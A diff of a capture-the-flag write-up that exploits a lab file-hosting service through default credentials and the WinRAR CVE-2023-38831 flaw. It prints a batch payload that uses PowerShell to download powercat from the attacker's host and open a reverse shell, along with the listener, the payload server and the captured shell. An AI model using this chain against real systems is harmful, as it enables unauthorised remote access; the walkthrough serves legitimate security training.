@@ -182,37 +182,56 @@ Web service running on port 80 requires windows authentication. We don't current
 ![Alt text](Screenshots/80_landing.png)
 
 Web service on port 8000 appears to be a file hosting application. It, too, requires authentication. 
-![Alt text](Screenshots/file-hosting-dashboard.png)
+![Alt text](Screenshots/file-hosting-landing.png)
 
 However, attempting simple admin:admin let's us in. 
+![Alt text](Screenshots/file-hosting-dashboard-2.png)
 
+We can upload, download, edit any type of file. 
 
-![Alt text](image.png)
-
+Moreover, developers left a note for us. 
 ```
 Please note that if you upload archive files, our application will unarchive and check for possible viruses. 
 ```
 
-the one that worked: https://github.com/Malwareman007/CVE-2023-38831
 
+If the application is unarchiving our compressed files and the system has a vulnerable WinRAR version installed, we can attempt to upload an exploit and test if it opens our exploit. For that we will search for public exploits of [CVE-2023-38831](https://github.com/b1tg/CVE-2023-38831-winrar-exploit).
+
+Clone the repo. 
 ```
 ┌──(kali㉿kali)-[~/Captivity]
-└─$ nc -nvlp 443
-listening on [any] 443 ...
-connect to [192.168.100.132] from (UNKNOWN) [192.168.100.130] 49934
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
+└─$ git clone https://github.com/b1tg/CVE-2023-38831-winrar-exploit
+Cloning into 'CVE-2023-38831-winrar-exploit'...
+remote: Enumerating objects: 29, done.
+remote: Counting objects: 100% (29/29), done.
+remote: Compressing objects: 100% (23/23), done.
+remote: Total 29 (delta 13), reused 14 (delta 4), pack-reused 0
+Receiving objects: 100% (29/29), 548.72 KiB | 372.00 KiB/s, done.
+Resolving deltas: 100% (13/13), done.
 
-Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+┌──(kali㉿kali)-[~/Captivity]
+└─$ cd CVE-2023-38831-winrar-exploit
+```
+Change the script.bat accordingly and prepare the exploit.
+```
+┌──(kali㉿kali)-[~/Captivity/CVE-2023-38831-winrar-exploit]
+└─$ cat script.bat                  
+powershell.exe -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.100.130/powercat.ps1'); powercat -c 192.168.100.130 -p 443 -e powershell"
 
-PS C:\Apps\Parser> 
+┌──(kali㉿kali)-[~/Captivity/CVE-2023-38831-winrar-exploit]
+└─$ python cve-2023-38831-exp-gen.py CLASSIFIED_DOCUMENTS.pdf script.bat exploit.rar
+BAIT_NAME: CLASSIFIED_DOCUMENTS.pdf
+SCRIPT_NAME: script.bat
+OUTPUT_NAME: exploit.rar
+ok..
 ```
 
+Now we need to download and host powercat.ps1.
 ```
 ┌──(kali㉿kali)-[~/Captivity]
 └─$ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
---2023-09-29 04:59:38--  https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+--2023-09-29 06:55:51--  https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 37667 (37K) [text/plain]
@@ -220,12 +239,52 @@ Saving to: ‘powercat.ps1’
 
 powercat.ps1                      100%[===========================================================>]  36.78K  --.-KB/s    in 0.03s   
 
-2023-09-29 04:59:39 (1.18 MB/s) - ‘powercat.ps1’ saved [37667/37667]
+2023-09-29 06:55:51 (1.18 MB/s) - ‘powercat.ps1’ saved [37667/37667]
 
                                                                                                                                       
 ┌──(kali㉿kali)-[~/Captivity]
-└─$ python -m http.server 80
+└─$ python -m http.server 80                                                       
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.100.130 - - [29/Sep/2023 05:15:27] "GET /powercat.ps1 HTTP/1.1" 200 -
 ```
+In a separate tab start a listener.
+```
+┌──(kali㉿kali)-[~/Captivity]
+└─$ nc -nvlp 443
+listening on [any] 443 ...
+```
+
+Now it is time to upload exploit.rar to the application. 
+
+![Alt text](Screenshots/file-hosting-upload-exploit.png)
+
+![Alt text](Screenshots/file-hosting-upload-exploit-2.png)
+
+
+After some time, we get a hit to the web server and receive a reverse shell!
+
+```
+┌──(kali㉿kali)-[~/Captivity]
+└─$ nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.100.132] from (UNKNOWN) [192.168.100.130] 50196
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Apps\Parser> whoami
+whoami
+capt\web_svc
+PS C:\Apps\Parser> type c:\users\web_svc\desktop\user1.txt
+type c:\users\web_svc\desktop\user1.txt
+ICSD{ab6ccbe923169afb4efc1b5a933af2c8}
+PS C:\Apps\Parser> 
+```
+
+
+
+
+
+
+
 
